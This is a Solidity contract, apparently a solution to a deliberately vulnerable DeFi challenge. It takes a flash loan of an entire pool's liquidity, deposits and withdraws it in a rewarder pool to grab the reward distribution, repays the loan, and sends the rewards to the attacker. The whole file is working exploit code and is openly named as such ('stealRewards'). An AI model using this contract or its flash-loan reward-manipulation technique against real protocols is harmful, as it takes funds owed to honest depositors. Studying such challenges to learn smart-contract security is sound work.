// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
interface IRewarderPool {
    function deposit(uint256 amountToDeposit) external;
    function withdraw(uint256 amountToWithdraw) external;
}

interface IFlashLoaner {
    function flashLoan(uint256 amount) external;
}

contract RewardsCracker {

    IERC20 public immutable liquidityToken;
    IERC20 public immutable rewardToken;
    IFlashLoaner public immutable flashLoan;
    IRewarderPool public immutable rewarderPool;
    address attacker;

    constructor(address _damnTokenAddress, address _flashLoaner, address _rewarderPool, address _rewardToken) {
        liquidityToken = IERC20(_damnTokenAddress);
        flashLoan = IFlashLoaner(_flashLoaner);
        rewarderPool = IRewarderPool(_rewarderPool);
        rewardToken = IERC20(_rewardToken);
        attacker = msg.sender;
    }
    
    // Function required by the structure of the flashLoan.
    function receiveFlashLoan(uint256 amount) external {
        rewarderPool.deposit(amount); // Generates the rewards.
        rewarderPool.withdraw(amount); // Burns the accToken getting liquidity back. 
        liquidityToken.transfer(address(flashLoan), amount);// Paying the loan back.
    }

    function stealRewards() public {
        uint256 maxLoan = liquidityToken.balanceOf(address(flashLoan));
        
        liquidityToken.approve(address(rewarderPool), maxLoan); // Allow the rewards pool to take our tokens.
        flashLoan.flashLoan(maxLoan); // From here, this contract will be in possession of the rewards.
        
        // Transfer the rewards to the attacker. The transfer function return is checked on-execution.
        require(rewardToken.transfer(attacker, rewardToken.balanceOf(address(this))));
    }




}